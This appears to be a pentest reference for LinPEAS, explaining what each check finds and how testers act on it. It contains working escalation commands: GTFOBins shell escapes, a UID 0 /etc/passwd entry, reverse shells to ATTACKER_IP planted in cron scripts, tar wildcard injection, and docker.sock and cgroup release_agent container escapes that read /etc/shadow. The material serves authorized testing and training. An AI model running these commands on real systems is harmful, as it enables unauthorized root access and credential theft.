# LinPEAS Checks Reference

This document details the privilege escalation checks performed by LinPEAS and how to interpret the findings.

## Table of Contents

- [Color-Coded Output](#color-coded-output)
- [Prioritizing Findings](#prioritizing-findings)
- [SUID/SGID Binaries](#suidsgid-binaries)
- [Linux Capabilities](#linux-capabilities)
- [Writable Files and Directories](#writable-files-and-directories)
- [Cron Jobs](#cron-jobs)
- [Services Running as Root](#services-running-as-root)
- [Kernel Exploits](#kernel-exploits)
- [Container Escapes](#container-escapes)
- [Additional Checks](#additional-checks)

---

## Color-Coded Output

LinPEAS uses a color-coding system to indicate the severity and exploitability of findings:

| Color | Meaning | Priority |
|-------|---------|----------|
| **RED/YELLOW** | 95% chance of privilege escalation vector | Critical - Investigate immediately |
| **RED** | High-confidence misconfiguration or vulnerability | High - Strong privesc candidate |
| **YELLOW** | Potential interesting finding worth investigating | Medium - Review for exploitation |
| **GREEN** | Useful information for enumeration | Low - Informational |
| **BLUE** | System information (neutral) | Info - Context only |
| **LIGHT CYAN** | Users with console access | Info - Note for later |
| **LIGHT MAGENTA** | Current user information | Info - Current context |

### Interpreting Colors

```
RED/YELLOW = Almost certainly exploitable (prioritize first)
RED        = Very likely exploitable (investigate second)
YELLOW     = Possibly exploitable (review third)
GREEN      = Useful info but not directly exploitable
```

---

## Prioritizing Findings

### Immediate Wins (Check First)

1. **RED/YELLOW findings** - These are almost always exploitable
2. **Writable /etc/passwd** - Add new root user
3. **SUID binaries on GTFOBins** - Direct shell escalation
4. **Dangerous capabilities** (CAP_SETUID, CAP_DAC_OVERRIDE)
5. **Writable cron scripts** run by root
6. **Sudo misconfigurations** (NOPASSWD, wildcards)

### Secondary Checks

1. Kernel version vs known exploits
2. Container/virtualization escapes
3. Writable service files
4. Weak file permissions on sensitive files
5. Internal services on localhost

### Information Gathering

1. Network configuration and open ports
2. Other users and groups
3. Installed software versions
4. Environment variables

---

## SUID/SGID Binaries

### What LinPEAS Checks

- All binaries with SUID bit set (`chmod u+s`)
- All binaries with SGID bit set (`chmod g+s`)
- Cross-references against GTFOBins database
- Identifies custom/non-standard SUID binaries

### Finding SUID Binaries Manually

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null
```

### Common Exploitable SUID Binaries

| Binary | Exploitation Method |
|--------|---------------------|
| `find` | `find . -exec /bin/sh -p \;` |
| `vim/vi` | `:!/bin/sh` or `:set shell=/bin/sh` then `:shell` |
| `nmap` (old) | `nmap --interactive` then `!sh` |
| `bash` | `bash -p` |
| `python` | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `less/more` | `!/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `cp` | Copy `/etc/passwd`, add root user, copy back |
| `mv` | Replace `/etc/passwd` with modified version |

### Exploitation Strategy

1. Check GTFOBins: https://gtfobins.github.io/
2. Look for custom binaries (not in standard paths)
3. Check if binary calls other programs (PATH hijacking)
4. Analyze with `strings` and `ltrace`/`strace`

---

## Linux Capabilities

### What LinPEAS Checks

- Files with capabilities set
- Current process capabilities
- Capabilities that allow privilege escalation

### Finding Capabilities Manually

```bash
# Find all files with capabilities
getcap -r / 2>/dev/null

# Check current process capabilities
cat /proc/self/status | grep Cap
capsh --decode=<hex_value>
```

### Dangerous Capabilities

| Capability | Risk | Exploitation |
|------------|------|--------------|
| `CAP_SETUID` | **Critical** | Change UID to 0 (root) |
| `CAP_SETGID` | **Critical** | Change GID to 0 (root) |
| `CAP_DAC_OVERRIDE` | **Critical** | Bypass file read/write permissions |
| `CAP_DAC_READ_SEARCH` | **High** | Read any file on system |
| `CAP_CHOWN` | **High** | Change ownership of any file |
| `CAP_FOWNER` | **High** | Bypass permission checks for file owner |
| `CAP_NET_RAW` | **Medium** | Raw socket access (sniffing) |
| `CAP_SYS_ADMIN` | **Critical** | Mount filesystems, many admin functions |
| `CAP_SYS_PTRACE` | **High** | Trace/debug any process |
| `CAP_NET_BIND_SERVICE` | **Low** | Bind to ports < 1024 |

### Exploitation Examples

```bash
# Python with CAP_SETUID
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with CAP_SETUID
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Ruby with CAP_SETUID
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

# Tar with CAP_DAC_READ_SEARCH (read /etc/shadow)
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
```

---

## Writable Files and Directories

### What LinPEAS Checks

- World-writable files and directories
- Files writable by current user/group
- Sensitive files with improper permissions
- Writable paths in $PATH

### Critical Writable Files

| File/Directory | Impact if Writable |
|----------------|-------------------|
| `/etc/passwd` | Add user with UID 0 |
| `/etc/shadow` | Change root password |
| `/etc/sudoers` | Grant sudo access |
| `/etc/crontab` | Add malicious cron job |
| `/etc/cron.d/*` | Add malicious cron job |
| `/etc/init.d/*` | Modify startup scripts |
| `/etc/systemd/system/*` | Modify service files |
| `/root/.ssh/authorized_keys` | Add SSH key for root |
| PATH directories | Binary hijacking |

### Exploitation: Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Add root user (if /etc/passwd is writable)
echo 'hacker:$1$xyz$Abc123...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new root user
su hacker
```

### PATH Hijacking

```bash
# If writable directory is before /usr/bin in PATH
echo '/bin/bash' > /writable/path/targetbinary
chmod +x /writable/path/targetbinary
# Run command that calls targetbinary as root
```

---

## Cron Jobs

### What LinPEAS Checks

- `/etc/crontab` contents
- `/etc/cron.d/*` files
- `/etc/cron.{hourly,daily,weekly,monthly}/*`
- User crontabs (`/var/spool/cron/crontabs/*`)
- Scripts called by cron jobs
- Writable cron scripts
- Cron jobs with wildcards

### Finding Cron Jobs Manually

```bash
# System crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# User crontabs
cat /var/spool/cron/crontabs/*

# Systemd timers
systemctl list-timers --all
```

### Exploitation Vectors

**Writable Cron Script:**
```bash
# If /opt/backup.sh is run by root cron and writable
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh
```

**Wildcard Injection (tar):**
```bash
# If cron runs: tar -cf /backup/backup.tar *
# In the target directory, create:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

**PATH Exploitation:**
```bash
# If cron script calls binary without full path
# And you can write to a PATH directory
echo '#!/bin/bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/scriptname
chmod +x /tmp/scriptname
export PATH=/tmp:$PATH
```

---

## Services Running as Root

### What LinPEAS Checks

- Processes running as root
- Services with writable configuration files
- Services with writable binary paths
- Internal services (localhost only)
- Services with known vulnerabilities

### Finding Services Manually

```bash
# Running processes as root
ps aux | grep root

# Listening services
ss -tlnp
netstat -tlnp

# Systemd services
systemctl list-units --type=service --state=running

# Service configurations
ls -la /etc/systemd/system/
```

### Exploitation Strategies

**Writable Service Binary:**
```bash
# Replace service binary with reverse shell
cp /bin/bash /path/to/service_binary
# Or create payload that spawns shell
```

**Service Configuration Manipulation:**
```bash
# If service file is writable
# Add ExecStart with malicious command
```

**Localhost Services:**
- MySQL running as root without password
- Internal web applications
- Debug interfaces (Flask debug, etc.)

---

## Kernel Exploits

### What LinPEAS Checks

- Kernel version
- Known vulnerable kernel versions
- Suggests potential exploits (Dirty COW, etc.)
- Distribution-specific vulnerabilities

### Checking Kernel Version

```bash
uname -a
uname -r
cat /etc/os-release
cat /proc/version
```

### Notable Kernel Exploits

| Exploit | Kernel Versions | CVE |
|---------|-----------------|-----|
| Dirty COW | 2.6.22 - 4.8.3 | CVE-2016-5195 |
| Dirty Pipe | 5.8 - 5.16.11 | CVE-2022-0847 |
| PwnKit | polkit < 0.120 | CVE-2021-4034 |
| Baron Samedit | sudo < 1.9.5p2 | CVE-2021-3156 |
| OverlayFS | Various | CVE-2021-3493 |
| Netfilter | 5.4 - 5.6.10 | CVE-2022-25636 |

### Exploitation Resources

- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
- Linux Exploit Suggester 2: https://github.com/jondonas/linux-exploit-suggester-2
- Searchsploit: `searchsploit linux kernel <version>`

### Important Considerations

- Kernel exploits may crash the system
- Test in lab environment first when possible
- Check if exploit requires compilation on target
- Some exploits only work on specific distributions

---

## Container Escapes

### What LinPEAS Checks

- Detection of container environment (Docker, LXC, Kubernetes)
- Mounted docker.sock
- Privileged container indicators
- Capabilities granted to container
- Host filesystem access

### Container Detection

```bash
# Check for container indicators
cat /proc/1/cgroup
ls -la /.dockerenv
env | grep -i docker
env | grep -i kubernetes
```

### Docker Socket Escape

```bash
# If /var/run/docker.sock is mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash

# Or create privileged container
docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it ubuntu
```

### Privileged Container Escape

```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = privileged

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Or use release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

### Kubernetes Pod Escape

- Check for service account tokens
- Look for hostPath mounts
- Check for hostNetwork/hostPID settings
- Enumerate cluster permissions with `kubectl auth can-i --list`

---

## Additional Checks

### Sudo Misconfigurations

```bash
# Check sudo permissions
sudo -l

# Look for:
# - NOPASSWD entries
# - Wildcard usage (*)
# - LD_PRELOAD/LD_LIBRARY_PATH
# - env_keep settings
# - Binaries exploitable via GTFOBins
```

### SSH Keys and Credentials

- Private SSH keys in user directories
- SSH keys with weak permissions
- Authorized keys that can be modified
- SSH config files with interesting hosts

### Interesting Files

- Config files with passwords
- Database files (SQLite, etc.)
- Backup files
- Log files with credentials
- .bash_history files
- Application configuration

### Network Information

- Internal network services
- ARP cache for host discovery
- Routes and interfaces
- Firewall rules

---

## Quick Reference: LinPEAS Priority Order

1. Check RED/YELLOW findings first
2. Review sudo permissions (`sudo -l`)
3. Check SUID/SGID binaries against GTFOBins
4. Look for writable cron scripts
5. Check file capabilities
6. Review writable sensitive files
7. Check kernel version for exploits
8. Look for container escape vectors
9. Enumerate internal services
10. Check for credentials in files

## References

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/)
- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng)
